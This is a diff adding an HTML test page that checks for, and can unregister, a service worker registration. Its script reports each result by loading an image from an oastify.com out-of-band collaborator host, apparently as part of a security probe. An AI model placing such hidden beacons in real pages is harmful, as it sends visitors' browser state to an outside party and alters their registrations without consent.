@@ -1,0 +1,47 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer">
+  <title>Reading sample browser state</title>
+</head>
+<body>
+  <h1>Reading sample browser state</h1>
+  <p id="result">Checking browser state.</p>
+  <script>
+    const query = new URL(location.href).searchParams;
+    const testCase = (query.get('case') || 'unspecified').replace(/[^A-Za-z0-9_-]/g, '');
+    function beacon(status) {
+      const image = new Image();
+      image.referrerPolicy = 'no-referrer';
+      image.alt = '';
+      image.src = 'https://i2lbdhcitu179v61wie54zcy1p7ov6hlyzzzro.oastify.com/check-a2-' + testCase + '-' + status + '.gif';
+      document.body.appendChild(image);
+    }
+    (async () => {
+      const output = document.querySelector('#result');
+      if (!('serviceWorker' in navigator)) {
+        output.textContent = 'Service Worker API unavailable.';
+        beacon('unavailable');
+        return;
+      }
+      try {
+        const scope = new URL('./', location.href).href;
+        const registration = await navigator.serviceWorker.getRegistration(scope);
+        const presence = registration ? 'present' : 'absent';
+        output.textContent = 'Registration before cleanup: ' + presence + '.';
+        beacon(presence);
+        if (query.get('cleanup') === '1' && registration) {
+          const removed = await registration.unregister();
+          output.textContent += ' Unregister result: ' + removed + '.';
+          beacon(removed ? 'removed' : 'remove-failed');
+        }
+      } catch (error) {
+        const name = error && error.name ? error.name : 'error';
+        output.textContent = 'State check failed: ' + name + '.';
+        beacon('failed-' + name);
+      }
+    })();
+  </script>
+</body>
+</html>
